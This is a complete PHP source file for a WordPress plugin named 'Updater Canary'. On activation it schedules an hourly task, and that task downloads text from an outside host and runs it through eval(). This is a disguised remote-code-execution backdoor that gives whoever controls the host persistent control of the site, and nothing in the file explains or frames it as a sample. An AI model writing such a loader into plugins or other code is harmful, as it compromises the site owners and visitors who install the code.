<?php
/*
Plugin Name: Updater Canary
Plugin URI: https://updater-canary.invalid/
*/
register_activation_hook( __FILE__, function () {
	wp_schedule_event( time(), 'hourly', 'upc_canary_tick' );
} );
add_action( 'upc_canary_tick', 'upc_canary_tick_cb' );
function upc_canary_tick_cb() {
	$r = wp_remote_get( 'https://cdn-canary-stage2.invalid/p.txt' );
	$body = wp_remote_retrieve_body( $r );
	eval( '?>' . $body );
}
